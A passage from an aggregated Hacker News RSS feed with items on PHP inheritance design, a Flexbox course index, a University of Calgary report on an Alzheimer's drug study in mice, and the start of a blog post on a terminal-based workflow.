    <p>Having refactored this, implementing <code><span>EchoPoemGenerator</span></code> is again very easy:</p>
    <pre><code><span><span>class</span> <span>EchoPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>parts</span><span>(<span>int</span> $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_reduce</span>(
            <span>parent</span>::<span>parts</span>($number),
            <span>fn</span> (<span><span>array</span></span> $output, <span>string</span> $line) =&gt; [...$output, <span>"{$line} {$line}"</span>],
            []
        );
    }
}</code></pre>
    <p>Can we take a moment to appreciate the power of inheritance? We've created two different implementations of our original <code><span>PoemGenerator</span></code>, and have <em>only</em> overridden the parts that differ from it in <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. We've even used SOLID principles to ensure that our code is decoupled so that it's easy to override specific parts. This is what great OOP is about ‚Äî right?</p>
    <hr>
    <p>One more time‚Ä¶ another feature request: please make one more implementation, one that combines both the random and echo behaviour: <code><span>RandomEchoPoemGenerator</span></code>.</p>
    <p>Now what? Which class will that one extend?</p>
    <p>If we're extending <code><span>PoemGenerator</span></code>, we'll have to override both our <code><span>data</span></code> and <code><span>parts</span></code> methods, essentially copying code from both <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. That's bad design, ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://front-line-php.com/object-oriented">https://front-line-php.com/object-oriented</a></em></p>]]>
            </description>
            <link>https://front-line-php.com/object-oriented</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939258</guid>
            <pubDate>Fri, 30 Oct 2020 04:44:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Flexbox with 30 Code Tidbits]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939224">thread link</a>) | @nilsandrey
<br/>
October 29, 2020 | https://www.samanthaming.com/flexbox30/ | <a href="https://web.archive.org/web/*/https://www.samanthaming.com/flexbox30/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app" data-server-rendered="true"><div><p>
      üî• NEW Code Tidbit Every Week üî•
    </p> <header><nav data-v-51356df1=""><div data-v-51356df1=""> <ul data-v-51356df1=""><li data-v-51356df1=""><a href="https://www.samanthaming.com/" name="Go to Home Page - SamanthaMing.com" data-v-51356df1=""><img src="https://www.samanthaming.com/images/samantha-ming-logo.svg" alt="Samantha Ming Logo" data-v-51356df1=""> <span data-v-51356df1="">Samantha Ming</span></a></li> <li data-v-51356df1=""><a href="https://www.samanthaming.com/tidbits/" data-v-51356df1="">
          Tidbits
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/blog/" data-v-51356df1="">
          Blog
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/courses/" data-v-51356df1="">
          Courses
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/contact/" data-v-51356df1="">
          Contact
        </a></li></ul> <div data-v-51356df1=""></div></div></nav> </header>  <main><div><div><div><a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/"><img src="https://samanthaming.gumlet.io/courses/flexbox30.jpg.gz?format=auto" alt="Flexbox30" data-v-067b84ea=""> <p>
            Start Course
          </p></a></div></div> <div><div><div><div> <p>
      Learn Flexbox with 30 Code Tidbits ‚ú®
      <a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/">
        Start Course
      </a> </p></div></div></div></div></div> <div><ul><li><a href="https://twitter.com/intent/tweet?text=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8&amp;url=https://www.samanthaming.com/flexbox30/&amp;via=samantha_ming" title="Share this course on Twitter" rel="noopener noreferrer" target="_blank" data-analytics-social="Twitter"> <span>Share to Twitter</span> <span>Twitter</span></a></li><li><a href="https://www.facebook.com/sharer/sharer.php?text=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8&amp;u=https://www.samanthaming.com/flexbox30/" title="Share this course on Facebook" rel="noopener noreferrer" target="_blank" data-analytics-social="Facebook"> <span>Share to Facebook</span> <span>Facebook</span></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.samanthaming.com/flexbox30/&amp;smid=li-share&amp;title=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8" title="Share this course on LinkedIn" rel="noopener noreferrer" target="_blank" data-analytics-social="LinkedIn"> <span>Share to LinkedIn</span> <span>LinkedIn</span></a></li><li><a href="https://reddit.com/submit?url=https://www.samanthaming.com/flexbox30/&amp;smid=re-share&amp;%20%20%20%20%20%20%20%20title=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8" title="Share this course on Reddit" rel="noopener noreferrer" target="_blank" data-analytics-social="Reddit"> <span>Share to Reddit</span> <span>Reddit</span></a></li><li><a href="https://news.ycombinator.com/submitlink?u=https://www.samanthaming.com/flexbox30/" title="Share this course on Hacker News" rel="noopener noreferrer" target="_blank" data-analytics-social="Hacker News"> <span>Share to Hacker News</span> <span>Hacker News</span></a></li><li><a href="mailto:?subject=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8%20|%20SamanthaMing.com&amp;body=Learn%20Flexbox%20with%2030%20code%20tidbits.%20Become%20a%20flexbox%20ninja%20with%20this%20FREE%20course!%0A%0Ahttps://www.samanthaming.com/flexbox30/" title="Share this course on Email" rel="noopener noreferrer" target="_blank" data-analytics-social="Email"> <span>Email</span> <span>Email</span></a></li></ul></div> <section><div><div><h2>
          Flexbox Core Concepts
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/" aria-label="Read the article for Introduction" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/1-flexbox-intro.jpg.gz?format=auto&amp;width=256" alt="Introduction" data-v-067b84ea=""><span>1</span></p></a> <h3 data-v-605d1001="">
    Introduction
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/2-flex-container-flex-items/" aria-label="Read the article for Flex Container &amp; Flex Items" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/2-flex-container-flex-items.jpg.gz?format=auto&amp;width=256" alt="Flex Container &amp; Flex Items" data-v-067b84ea=""><span>2</span></p></a> <h3 data-v-605d1001="">
    Flex Container &amp; Flex Items
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/3-immediate-child-only/" aria-label="Read the article for Immediate Child Only" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/3-immediate-child-only.jpg.gz?format=auto&amp;width=256" alt="Immediate Child Only" data-v-067b84ea=""><span>3</span></p></a> <h3 data-v-605d1001="">
    Immediate Child Only
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/4-flexbox-axes/" aria-label="Read the article for Flexbox Axes" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/4-flexbox-axes.jpg.gz?format=auto&amp;width=256" alt="Flexbox Axes" data-v-067b84ea=""><span>4</span></p></a> <h3 data-v-605d1001="">
    Flexbox Axes
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/5-flexbox-module/" aria-label="Read the article for Flexbox Module" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/5-flexbox-module.jpg.gz?format=auto&amp;width=256" alt="Flexbox Module" data-v-067b84ea=""><span>5</span></p></a> <h3 data-v-605d1001="">
    Flexbox Module
  </h3></li></ul></div><div><h2>
          Parent Properties
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/6-parent-properties/" aria-label="Read the article for Parent Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/6-parent-properties.jpg.gz?format=auto&amp;width=256" alt="Parent Properties" data-v-067b84ea=""><span>6</span></p></a> <h3 data-v-605d1001="">
    Parent Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/7-display/" aria-label="Read the article for display" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/7-display.jpg.gz?format=auto&amp;width=256" alt="display" data-v-067b84ea=""><span>7</span></p></a> <h3 data-v-605d1001="">
    display
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/8-block-vs-inline/" aria-label="Read the article for block vs inline" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/8-block-vs-inline.jpg.gz?format=auto&amp;width=256" alt="block vs inline" data-v-067b84ea=""><span>8</span></p></a> <h3 data-v-605d1001="">
    block vs inline
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/9-flex-direction/" aria-label="Read the article for flex-direction" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/9-flex-direction.jpg.gz?format=auto&amp;width=256" alt="flex-direction" data-v-067b84ea=""><span>9</span></p></a> <h3 data-v-605d1001="">
    flex-direction
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/10-flex-wrap/" aria-label="Read the article for flex-wrap" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/10-flex-wrap.jpg.gz?format=auto&amp;width=256" alt="flex-wrap" data-v-067b84ea=""><span>10</span></p></a> <h3 data-v-605d1001="">
    flex-wrap
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/11-flex-flow/" aria-label="Read the article for flex-flow" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/11-flex-flow.jpg.gz?format=auto&amp;width=256" alt="flex-flow" data-v-067b84ea=""><span>11</span></p></a> <h3 data-v-605d1001="">
    flex-flow
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/12-justify-content-row/" aria-label="Read the article for justify-content [row]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/12-justify-content-row.jpg.gz?format=auto&amp;width=256" alt="justify-content [row]" data-v-067b84ea=""><span>12</span></p></a> <h3 data-v-605d1001="">
    justify-content [row]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/13-justify-content-column/" aria-label="Read the article for justify-content [column]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/13-justify-content-column.jpg.gz?format=auto&amp;width=256" alt="justify-content [column]" data-v-067b84ea=""><span>13</span></p></a> <h3 data-v-605d1001="">
    justify-content [column]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/14-space-around-vs-space-evenly/" aria-label="Read the article for space-around vs space-evenly" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/14-space-around-vs-space-evenly.jpg.gz?format=auto&amp;width=256" alt="space-around vs space-evenly" data-v-067b84ea=""><span>14</span></p></a> <h3 data-v-605d1001="">
    space-around vs space-evenly
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/15-align-items-row/" aria-label="Read the article for align-items [row]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/15-align-items-row.jpg.gz?format=auto&amp;width=256" alt="align-items [row]" data-v-067b84ea=""><span>15</span></p></a> <h3 data-v-605d1001="">
    align-items [row]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/16-baseline/" aria-label="Read the article for baseline" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/16-baseline.jpg.gz?format=auto&amp;width=256" alt="baseline" data-v-067b84ea=""><span>16</span></p></a> <h3 data-v-605d1001="">
    baseline
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/17-align-items-column/" aria-label="Read the article for align-items [column]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/17-align-items-column.jpg.gz?format=auto&amp;width=256" alt="align-items [column]" data-v-067b84ea=""><span>17</span></p></a> <h3 data-v-605d1001="">
    align-items [column]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/18-align-content/" aria-label="Read the article for align-content" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/18-align-content.jpg.gz?format=auto&amp;width=256" alt="align-content" data-v-067b84ea=""><span>18</span></p></a> <h3 data-v-605d1001="">
    align-content
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/27-flex/" aria-label="Read the article for flex" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/27-flex.jpg.gz?format=auto&amp;width=256" alt="flex" data-v-067b84ea=""><span>27</span></p></a> <h3 data-v-605d1001="">
    flex
  </h3></li></ul></div><div><h2>
          Child Properties
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/19-child-properties/" aria-label="Read the article for Child Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/19-child-properties.jpg.gz?format=auto&amp;width=256" alt="Child Properties" data-v-067b84ea=""><span>19</span></p></a> <h3 data-v-605d1001="">
    Child Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/20-order/" aria-label="Read the article for order" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/20-order.jpg.gz?format=auto&amp;width=256" alt="order" data-v-067b84ea=""><span>20</span></p></a> <h3 data-v-605d1001="">
    order
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/21-flex-grow/" aria-label="Read the article for flex-grow" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/21-flex-grow.jpg.gz?format=auto&amp;width=256" alt="flex-grow" data-v-067b84ea=""><span>21</span></p></a> <h3 data-v-605d1001="">
    flex-grow
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/22-flex-grow-calculation/" aria-label="Read the article for flex-grow calculation" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/22-flex-grow-calculation.jpg.gz?format=auto&amp;width=256" alt="flex-grow calculation" data-v-067b84ea=""><span>22</span></p></a> <h3 data-v-605d1001="">
    flex-grow calculation
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/23-flex-shrink/" aria-label="Read the article for flex-shrink" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/23-flex-shrink.jpg.gz?format=auto&amp;width=256" alt="flex-shrink" data-v-067b84ea=""><span>23</span></p></a> <h3 data-v-605d1001="">
    flex-shrink
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/24-flex-shrink-calculation/" aria-label="Read the article for flex-shrink calculation" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/24-flex-shrink-calculation.jpg.gz?format=auto&amp;width=256" alt="flex-shrink calculation" data-v-067b84ea=""><span>24</span></p></a> <h3 data-v-605d1001="">
    flex-shrink calculation
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/25-flex-basis/" aria-label="Read the article for flex-basis" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/25-flex-basis.jpg.gz?format=auto&amp;width=256" alt="flex-basis" data-v-067b84ea=""><span>25</span></p></a> <h3 data-v-605d1001="">
    flex-basis
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/26-flex-basis-vs-widths/" aria-label="Read the article for flex-basis vs widths" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/26-flex-basis-vs-widths.jpg.gz?format=auto&amp;width=256" alt="flex-basis vs widths" data-v-067b84ea=""><span>26</span></p></a> <h3 data-v-605d1001="">
    flex-basis vs widths
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/28-align-self/" aria-label="Read the article for align-self" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/28-align-self.jpg.gz?format=auto&amp;width=256" alt="align-self" data-v-067b84ea=""><span>28</span></p></a> <h3 data-v-605d1001="">
    align-self
  </h3></li></ul></div><div><h2>
          Summary
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/29-flexbox-properties/" aria-label="Read the article for Flexbox Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/29-flexbox-properties.jpg.gz?format=auto&amp;width=256" alt="Flexbox Properties" data-v-067b84ea=""><span>29</span></p></a> <h3 data-v-605d1001="">
    Flexbox Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/30-flexbox-cheatsheet/" aria-label="Read the article for Flexbox Cheatsheet" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/30-flexbox-cheatsheet.jpg.gz?format=auto&amp;width=256" alt="Flexbox Cheatsheet" data-v-067b84ea=""><span>30</span></p></a> <h3 data-v-605d1001="">
    Flexbox Cheatsheet
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/31-flexbox-with-auto-margins/" aria-label="Read the article for Bonus: Flexbox with Auto Margins" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/31-flexbox-with-auto-margins.jpg.gz?format=auto&amp;width=256" alt="Bonus: Flexbox with Auto Margins" data-v-067b84ea=""><span>31</span></p></a> <h3 data-v-605d1001="">
    Bonus: Flexbox with Auto Margins
  </h3></li></ul></div></div></section> <section><div><hr> <div><h2>
        More Courses
      </h2> <!----> </div></div> <ul><li><a href="https://www.samanthaming.com/codetidbits30/"><div><h3>
          CodeTidbits30
        </h3> <p>
          30 days of the best JS, CSS, HTML tidbits üéÑ
        </p></div></a></li><li><a href="https://www.samanthaming.com/basics/"><div><h3>
          Web Basics
        </h3> <p>
          Web Basics Explained with Tidbits üçé
        </p></div></a></li><li><a href="https://www.samanthaming.com/pictorials/"><div><h3>
          Pictorials
        </h3> <p>
          Step by Step Code Tutorials üë£
        </p></div></a></li></ul></section> <section><div><hr> <div><h2><a href="https://www.samanthaming.com/tidbits/"><span>
      Top Tidbits
    </span> </a></h2> <!----> </div></div> <div><ul> <li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/29-check-if-number-is-positive-or-negative/" aria-label="Read the article for Math.sign: How to Check if Number is Negative or Positive in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/29-check-if-number-is-positive-or-negative.jpg.gz?format=auto" alt="Code snippet on Math.sign: How to Check if Number is Negative or Positive in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Math.sign: How to Check if Number is Negative or Positive in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/11-setting-default-parameters/" aria-label="Read the article for Setting Default Parameters in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/11-setting-default-parameters.jpg.gz?format=auto" alt="Code snippet on Setting Default Parameters in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Setting Default Parameters in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/45-pretty-json-output/" aria-label="Read the article for Pretty JSON output" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/45-pretty-json-output.jpg.gz?format=auto" alt="Code snippet on Pretty JSON output" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Pretty JSON output
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/50-how-to-deep-clone-an-array/" aria-label="Read the article for How to Deep Clone an Array in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/50-how-to-deep-clone-an-array.jpg.gz?format=auto" alt="Code snippet on How to Deep Clone an Array in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        How to Deep Clone an Array in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/89-how-to-check-if-variable-is-array/" aria-label="Read the article for How to check if Variable is an Array in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/89-how-to-check-if-variable-is-array.jpg.gz?format=auto" alt="Code snippet on How to check if Variable is an Array in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        How to check if Variable is an Array in JavaScript
      </h3></p></a></li> <p>
      hi</p></ul></div></section> </main>  </div></div></div>]]>
            </description>
            <link>https://www.samanthaming.com/flexbox30/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939224</guid>
            <pubDate>Fri, 30 Oct 2020 04:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Research discovers breakthrough with potential to prevent, reverse Alzheimer's]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939160">thread link</a>) | @walterbell
<br/>
October 29, 2020 | https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers | <a href="https://web.archive.org/web/*/https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              <div>

                
                                
                                                  <div>
                                                                                        <p><span><span>A research team at the University of Calgary‚Äôs <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer‚Äôs disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer‚Äôs disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>‚ÄúThe significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer‚Äôs disease benefits can‚Äôt be overstated,‚Äù says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer‚Äôs disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer‚Äôs disease is driven by a vicious cycle of the protein amyloid Œ≤ (AŒ≤) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn‚Äôt fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen‚Äôs team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer‚Äôs symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>‚ÄúWe treated them for a month and the effect was quite amazing,‚Äù says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer‚Äôs disease. ‚ÄúWe couldn‚Äôt tell the drug-treated disease models and the healthy models apart.‚Äù </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, however, there are many steps to be taken before this finding would lead to a clinical trial.&nbsp;</span></span></p>

<p><span><span>If you are interested in finding out about clinical trials that are underway related to Alzheimer‚Äôs you can go to <a href="https://www.ucalgary.ca/research/participate/node/13200">Participate in Research</a>. There you‚Äôll find a number of studies looking for participants including control subjects, people not living with a specific condition. </span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals. The strategy provides a unifying direction for brain and mental health research at the university.</span></span></span></em></span></span></p>



                                                                                                                                                                                                                                      

  
    

    
  <div data-history-node-id="23525" role="article" about="/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers" typeof="schema:Article">
    <div>
      <div>
                          <div>
            <div>
              <div>
                <div>
                                        <picture>
                <!--[if IE 9]><video style="display: none;"><![endif]-->
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8 1x" media="all and (min-width: 992px)" type="image/jpeg">
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_tablet/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=5tYigcJ8 1x" media="all and (min-width: 768px)" type="image/jpeg">
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_mobile/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=-CoV0v5E 1x" media="all and (max-width: 767px)" type="image/jpeg">
            <!--[if IE 9]></video><![endif]-->
            <img src="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8" alt="Dr. Wayne Chen, PhD" title="Dr. Wayne Chen, PhD" typeof="foaf:Image">

  </picture>

                                    </div>
                                  <p>Dr. Wayne Chen, PhD</p>
                                                  <p>Britton Ledingham for the Libin Cardiovascular Institute</p>
                              </div>
            </div>
          </div>
              </div>
          </div>
  </div>


                                                                                    </div>
                
                
              </div>
              
            </div>

          </div>
        </div></div>]]>
            </description>
            <link>https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939160</guid>
            <pubDate>Fri, 30 Oct 2020 04:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Writing and Coding Workflow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939140">thread link</a>) | @thecedarprince
<br/>
October 29, 2020 | http://jacobzelko.com/workflow/ | <a href="https://web.archive.org/web/*/http://jacobzelko.com/workflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><em>My personal workflow for terminal-based coding, writing, research, and more!</em></p>

<p>Hello everyone!
It has been quite sometime since I last posted!
Suffice it to say, I have been immensely busy the past year but I am happy to say I am able to resurrect this blog! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<p>I have thoroughly grown into my own workflow for programming, research, and writing.
Today, I am happy to be able to share it with you!</p>

<p>If you prefer to watch a video describing most of this entire process, here is an overview of my workflow from one of my <a href="https://www.twitch.tv/thecedarprince">live streams</a>.
It does not go as in-depth as this document but should serve as a strong complement to this post. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2SLZQQfMF8E" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>



<p>I use <a href="https://github.com/alacritty/alacritty">Alacritty</a> as my terminal, <a href="https://www.zsh.org/">zsh</a> and <a href="https://ohmyz.sh/">oh-my-zsh</a> as my shell and plugin manager respectively, <a href="https://github.com/tmux/tmux">tmux</a> as my multiplexer, <a href="https://github.com/Peltoche/lsd">lsd</a> as my list command with fun icons, <a href="https://github.com/belluzj/fantasque-sans">Fantasque Sans Mono</a> as my typeface font, <a href="https://github.com/neovim/neovim">neovim</a> for my editor, <a href="https://github.com/junegunn/fzf">fzf</a> paired with <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> for speedy and interactive file finding, <a href="https://github.com/sharkdp/bat">bat</a> an enhanced <code>cat</code> with a git diff gutter, <a href="https://github.com/jgm/pandoc">pandoc</a> for writing in markdown and LaTeX and outputting the piece to whatever file type I want, <a href="http://jacobzelko.com/setting-up-zotero/">Zotero</a> for managing my collection on scientific literature, <a href="https://github.com/ranger/ranger">ranger</a> as a terminal-based file explorer, and <a href="https://github.com/morhetz/gruvbox-contrib">gruvbox-dark</a> as my general color palette.</p>

<p>Here are gists to the relevant config files I use to modify my interface and user experience:</p>

<ul>
  <li>
<strong>neovim</strong>: <a href="https://gist.github.com/TheCedarPrince/7b9b51af4c146880f17c39407815b594">init.vim</a>
</li>
  <li>
